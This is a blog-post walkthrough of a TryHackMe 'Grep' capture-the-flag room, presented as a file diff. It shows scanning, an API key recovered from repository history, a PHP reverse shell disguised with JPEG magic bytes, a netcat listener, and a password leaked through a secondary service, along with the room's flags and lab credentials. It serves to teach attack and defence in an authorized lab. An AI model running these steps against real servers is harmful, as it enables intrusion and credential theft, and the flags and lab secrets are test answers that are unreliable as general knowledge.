@@ -1,0 +1,260 @@
+---
+title: "TryHackMe Grep: From Virtual Hosts to Credential Disclosure"
+date: "2026-10-14"
+tags: ["tryhackme", "linux", "web-security", "reverse-shell"]
+excerpt: "A practical walkthrough of my Grep room investigation, covering virtual-host discovery, repository-history analysis, an unsafe upload flow, reverse-shell access, and credential disclosure through a secondary service."
+category: "writeup"
+---
+
+I solved [TryHackMe's Grep room](https://tryhackme.com/room/greprtp) by following the application from its public-facing web service to a secondary hostname that exposed the final credential. The room combines Linux and web-enumeration basics with a few issues that are easy to miss when investigated separately.
+
+The main path was:
+
+1. Identify the target services and virtual hosts.
+2. Recover a registration API key from public repository history.
+3. Use the authenticated upload feature to obtain a reverse shell.
+4. Find an exposed database backup and an administrator email address.
+5. Use the LeakChecker service to disclose the administrator password.
+
+All testing described here was performed inside the authorized TryHackMe lab.
+
+## Network setup
+
+I connected to the TryHackMe VPN before starting the enumeration. The target used in this walkthrough was:
+
+```text
+10.48.163.30
+```
+
+## 1. Port scanning
+
+I started with service detection and then expanded to a full TCP scan:
+
+```bash
+nmap -sC -sV 10.48.163.30
+nmap -p- -T4 10.48.163.30
+sudo nmap -sS -sV -T4 --open 10.48.163.30
+sudo nmap -sS -sV --top-ports 5000 -T4 --open 10.48.163.30
+sudo nmap -n -Pn -p- -A --min-parallelism 100 -T5 10.48.163.30
+```
+
+The scan exposed:
+
+- SSH on port 22
+- HTTP and HTTPS services
+- An additional HTTP service on port 51337
+
+The HTTPS certificate also suggested that the web server expected a hostname instead of the raw IP address.
+
+## 2. Configuring the virtual hosts
+
+I mapped the application hostnames locally in `/etc/hosts`:
+
+```text
+10.48.163.30 grep.thm
+10.48.163.30 leakchecker.grep.thm
+```
+
+Requesting the server by IP returned the default Apache site. Once I used `grep.thm`, the SearchME application became available.
+
+## 3. Enumerating the web application
+
+I used Feroxbuster against both HTTP and HTTPS with a directory-list wordlist:
+
+```bash
+feroxbuster -w directory-list.txt -u 'https://grep.thm'
+feroxbuster -w directory-list.txt -u 'http://grep.thm'
+```
+
+The useful paths were:
+
+```text
+https://grep.thm/public/html/index.php
+https://grep.thm/public/html/register.php
+https://grep.thm/public/html/login.php
+https://grep.thm/public/html/dashboard.php
+https://grep.thm/public/html/upload.php
+https://grep.thm/api/upload.php
+https://grep.thm/api/uploads/
+```
+
+The dashboard and upload functionality required an account, so I focused on the registration endpoint next.
+
+## 4. Recovering the registration API key
+
+The registration endpoint rejected requests without an API key. I reviewed the public SearchME CMS source and its repository history. An older commit still contained the key that the application expected:
+
+```text
+ffe60ecaa8bba2f12b43d1a4b15b8f39
+```
+
+I supplied the key through the browser and Burp workflow, created an account, and logged in.
+
+The first room flag was available after successful registration and authentication:
+
+```text
+THM{4ec9806d7e1350270dc402ba870ccebb}
+```
+
+## 5. Preparing the upload payload
+
+I searched my system for a PHP reverse-shell template:
+
+```bash
+locate php-reverse
+```
+
+I copied the PentestMonkey PHP reverse shell into the room workspace:
+
+```bash
+cp php-reverse-shell.php hacker.php
+mkdir grep
+mv hacker.php grep
+cd grep
+```
+
+I edited the payload and checked the VPN interface to identify the callback address:
+
+```bash
+nano hacker.php
+ip a
+```
+
+The shell was configured to connect back to my VPN address on port 443:
+
+```php
+$ip = '<YOUR_TUN0_OR_VPN_IP>';
+$port = 443;
+```
+
+## 6. Bypassing the upload validation
+
+The upload endpoint expected an image extension and checked the file signature. I created a copy with a JPEG-style name:
+
+```bash
+cp hacker.php hacker.jpg.php
+```
+
+I then edited the file header with a hex editor:
+
+```bash
+nano hacker.jpg.php
+hexeditor hacker.jpg.php
+```
+
+The resulting file began with JPEG magic bytes followed by PHP code:
+
+```text
+ff d8 ff e0 <?php
+```
+
+I uploaded the file through the authenticated profile and upload workflow. The uploaded payload was available at:
+
+```text
+https://grep.thm/api/uploads/hacker.jpg.php
+```
+
+## 7. Receiving the reverse shell
+
+I started a listener on port 443 before requesting the uploaded file:
+
+```bash
+nc -lnvp 443
+sudo nc -lnvp 443
+```
+
+Opening the uploaded PHP file caused the target to connect back to my listener and provided a shell on the server.
+
+## 8. Stabilizing the shell
+
+My local history did not preserve the shell-stabilization commands, so the following section is reconstructed from the session:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+## 9. Finding the database backup
+
+I inspected the web root and searched for application files and backups:
+
+```bash
+ls -la /var/www
+find /var/www -maxdepth 3 -type f 2>/dev/null
+cat /var/www/backup/users.sql
+```
+
+The database dump exposed the administrator email address:
+
+```text
+admin@searchme2023cms.grep.thm
+```
+
+The same enumeration showed that the LeakChecker application was also present on the target.
+
+## 10. Investigating LeakChecker
+
+I confirmed the second virtual host through the browser:
+
+```text
+https://leakchecker.grep.thm/
+https://leakchecker.grep.thm:51337/
+```
+
+LeakChecker provided an email lookup function. I submitted the administrator email found in `users.sql`:
+
+```text
+admin@searchme2023cms.grep.thm
+```
+
+The service disclosed the administrator password:
+
+```text
+admin_tryhackme!
+```
+
+That completed the room's final task.
+
+## Attack chain
+
+```text
+VPN connection
+    |
+    v
+Full TCP and service scan
+    |
+    v
+Virtual-host discovery: grep.thm
+    |
+    v
+Registration API key recovered from repository history
+    |
+    v
+Authenticated access to SearchME
+    |
+    v
+PHP reverse shell disguised as a JPEG
+    |
+    v
+www-data reverse shell
+    |
+    v
+Database backup enumeration
+    |
+    v
+Administrator email discovery
+    |
+    v
+LeakChecker on port 51337
+    |
+    v
+Administrator password disclosure
+```
+
+## Lessons learned
+
+- Check HTTPS virtual hosts when a certificate reveals a useful hostname.
+- Review public repository history because removed secrets may remain accessible.
+- Validate uploaded content safely instead of trusting filenames and basic magic bytes.
+- Keep database backups outside web-server directories and protect them appropriately.
+- Enumerate secondary services and hostnames after gaining initial access.
